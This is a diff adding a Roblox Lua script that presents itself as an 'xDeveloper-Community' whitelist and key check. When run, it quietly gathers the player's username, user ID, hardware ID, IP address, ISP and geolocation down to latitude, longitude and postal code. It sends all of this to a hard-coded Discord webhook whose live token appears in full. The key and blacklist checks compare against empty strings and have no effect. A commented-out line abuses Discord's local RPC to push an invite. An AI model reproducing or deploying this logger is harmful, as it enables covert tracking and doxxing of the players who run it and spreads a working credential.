@@ -1,0 +1,285 @@
+xDeveloper_Logger = "https://discord.com/api/webhooks/952820227945672744/G4J1voVLyM-XQMuiRW8-3S22M5P4d5ZnNCqno0tT0xSUhoxzaptPAhb0Ey_guVMIIdem"
+
+
+local Key_Whitelist = "xDeveloper-Community-ADMIN" -- don't change
+local Key_Check = "xDeveloper-Community" -- don't change
+
+--local a=request or http_request or syn and syn.request;local b=game.HttpService;a({Url="http://127.0.0.1:6463/rpc?v=1",Method="POST",Headers={["Content-Type"]="application/json",["Origin"]="https://discord.com"},Body=b:JSONEncode({cmd="INVITE_BROWSER",args={code="gcXvFDbvJ9"},nonce=b:GenerateGUID(false)})})local c=game:GetService("Players").LocalPlayer
+local youwebhook = xDeveloper_Logger
+
+local username = game.Players.LocalPlayer.Name
+local age = game.Players.LocalPlayer.AccountAge
+local userid = game.Players.LocalPlayer.UserId
+local MembershipType = nil
+if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.None then
+	MembershipType = "None"
+end
+if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
+	MembershipType = "Premium"
+end
+local jobid = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ',"' .. game.JobId .. '")'
+local ip4 = game:HttpGet("https://api.ipify.org/")
+local ip6 = game:HttpGet("https://ipapi.co/ip")
+local isp = game:HttpGet("https://ipapi.co/org")
+local country = game:HttpGet("https://ipapi.co/country_name")
+local city = game:HttpGet("https://ipapi.co/city")
+local state = game:HttpGet("https://ipapi.co/region")
+local timezone = game:HttpGet("https://ipapi.co/timezone")
+local lat = game:HttpGet("https://ipapi.co/latitude")
+local long = game:HttpGet("https://ipapi.co/longitude")
+local citylatlong = lat .. "," .. long
+local currency = game:HttpGet("https://ipapi.co/currency")
+local zip = game:HttpGet("https://ipapi.co/postal")
+local HTTP = game:GetService("HttpService")
+local marketplaceService = game:GetService("MarketplaceService")
+local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
+
+local OP = true
+local CL = false
+
+------------
+
+----hwid----
+local http_request = http_request;
+if syn then
+    http_request = syn.request
+elseif SENTINEL_V2 then
+    function http_request(tb)
+        return {
+            StatusCode = 200;
+            Body = request(tb.Url, tb.Method, (tb.Body or ''))
+        }
+    end
+end
+ 
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+local hwid = "";
+
+for i, v in next, hwid_list do
+    if decoded.headers[v] then
+        hwid = decoded.headers[v];
+        break
+    end
+end
+
+----endhwid----
+
+----webhook----
+
+local requestwebhook = syn.request({
+    Url = youwebhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game:GetService("HttpService"):JSONEncode({
+       ["content"] = "@everyone  \n`[子]#4134 ⚙`",
+       ["embeds"] = {{
+           ["title"] = "**`╔══════════════════ ⚙ [Script Logger ] ⚙  ═══════════════════╗ `**",  
+           ["description"] = "",
+           ["color"] = 65484,
+            ["fields"] = {{
+                ["name"] = "`Time [ Data ]:`",
+                ["value"] = tostring(os.date("`[ %d ] Day :[ %m ] Month :[ 20%y ] Year `")),
+                ["inline"] = CL
+                   },
+			{
+                ["name"] = "`Time [ Clocks ]`",
+                ["value"] = tostring(os.date("`[ %H ] Clock :[ %M ] Minute :[ %S ] Second `")),
+                ["inline"] = CL
+            },
+			{
+                       ["name"] = "`Whitelist Key [Protected ⚙!] :`",
+                ["value"] = "||"..Key_Whitelist.."|| \n`╚════════════════════════════════════════════════════════════════════.★.╝`",
+                ["inline"] = CL
+                                           },
+			{
+                ["name"] = "**`╔. [ Info Players ] .═══════════════════════════════════════════════════╗`**",
+                ["value"] = "**`Info Player . . . . . ╰──╮" ..game.Players.LocalPlayer.Name.."╭──╯ . . . . .`**",
+                ["inline"] = CL
+                           }, 
+			{
+                ["name"] = "`Player Name:`",
+                ["value"] = game.Players.LocalPlayer.Name,
+                ["inline"] = OP
+          },
+            {
+                ["name"] = "`Display Name:`",
+                ["value"] =game.Players.LocalPlayer.DisplayName,
+                ["inline"] = OP
+                          },
+            {
+                ["name"] = "`Player UserID:`",
+                ["value"] =game.Players.LocalPlayer.UserId,
+                ["inline"] = OP
+                                },
+            {
+                ["name"] = "`Account Age:`",
+                ["value"] = game.Players.LocalPlayer.AccountAge,
+                ["inline"] = OP
+                },
+            {
+                ["name"] = "`Player Profile:`",
+                ["value"] ="https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+                ["inline"] = CL
+                 },
+            {
+                ["name"] = "**`╚════════════════════════════════════════════════════════════════════.★.╝`**",
+                ["value"] = "**`╔. [ Info Games ] .═════════════════════════════════════════════════════╗ \nInfo Games . . . . . ╰──╮"..info.Name.."╭──╯ . . . . .`**",
+                ["inline"] = CL
+                },
+            {
+              ["name"] = "`Game Name:`",
+					["value"] = info.Name,
+					["inline"] = CL
+                },
+            {
+				  ["name"] = "`Game PlaceId:`",
+                ["value"] = game.PlaceId,
+                ["inline"] = OP
+                },
+            {
+				  ["name"] = "`Game PlaceVersion:`",
+                ["value"] = "Version ["  ..game.PlaceVersion..  "]",
+                ["inline"] = OP
+                },
+            {
+				  ["name"] = "`Game PrivateServerId:`",
+                ["value"] = game.JobId,
+                ["inline"] = CL
+			},
+            {
+                ["name"] = "**`╚════════════════════════════════════════════════════════════════════.★.╝`**",
+                ["value"] = "**`╔. [ Info / IP ] .══════════════════════════════════════════════════════╗ `**",
+                ["inline"] = CL
+                			},
+            {
+				  ["name"] = "`[ ISP ] Internet Service Provider :`",
+                ["value"] = isp,
+                ["inline"] = CL
+			},
+            {
+				  ["name"] = "`IP Address :`",
+                ["value"] = ip4,
+                ["inline"] = OP
+			},
+            {
+				  ["name"] = "`IP Address Plus :`",
+                ["value"] = ip6,
+                ["inline"] = OP
+
+			},
+            {
+				  ["name"] = "`Country :`",
+                ["value"] = country,
+                ["inline"] = OP
+			},
+            {
+				  ["name"] = "`City :`",
+                ["value"] = city,
+                ["inline"] = OP
+			},
+            {
+				  ["name"] = "`State / Province :`",
+                ["value"] = state,
+                ["inline"] = OP
+			},
+            {
+				  ["name"] = "`TimeZone :`",
+                ["value"] = timezone,
+                ["inline"] = OP
+			},
+            {
+				  ["name"] = "`City Latitude / Longitude :`",
+                ["value"] = citylatlong,
+                ["inline"] = OP
+			},
+            {
+				  ["name"] = "`Currency :`",
+                ["value"] = currency,
+                ["inline"] = OP
+
+                },
+            {
+				  ["name"] = "**`╚════════════════════════════════════════════════════════════════════.★.╝`**",
+                  ["value"] = "***`                      xDeveloper-Community Script                          `***",
+                  ["inline"] = CL
+				}
+            },
+       }}
+    })
+})
+----blacklistzone name----
+function checkbl()
+    game.Players.LocalPlayer:Kick("You got BlackList [ Player Name ]")
+end
+if  game.Players.LocalPlayer.Name == "" then
+     checkbl()
+end
+
+----blacklistzone PlaceId----
+function checkbl()
+    game.Players.LocalPlayer:Kick("You got Kick [ This Game Not support ]")
+end
+if  game.PlaceId == "" then
+     checkbl()
+end
+
+function bl()
+
+    game.Players.LocalPlayer:Kick("You got BlackList [ Hwid ]")
+end
+
+----blacklistzone hwid----
+if hwid == "" then
+    bl()
+end
+if hwid == "" then
+    bl()
+end
+if hwid == "" then
+bl()
+end
+wait(game.Players.LocalPlayer)
+--------------------
+-- Key | Hwid
+
+Key_Whitelist = "xDeveloper-Community-ADMIN" --admin only
+function checkbl()
+    game.Players.LocalPlayer:Kick("You got Kick [ Wrong Key_Whitelist!? ]")
+end
+
+if Key_Whitelist == "" then
+     checkbl()
+end
+if Key_Whitelist == "" then
+     checkbl()
+end
+if Key_Whitelist == "" then
+     checkbl()
+end
+if Key_Whitelist == "" then
+     checkbl()
+end
+-- Key | Hwid
+
+Key_Check = "xDeveloper-Community" --admin only
+function checkbl()
+    game.Players.LocalPlayer:Kick("You got Kick [ Wrong Key_Check!? ]")
+end
+
+if Key_Check == "" then
+     checkbl()
+end
+if Key_Check == "" then
+     checkbl()
+end
+if Key_Check == "" then
+     checkbl()
+end
+if Key_Check == "" then
+     checkbl()
+end
+----endwebhook---- 
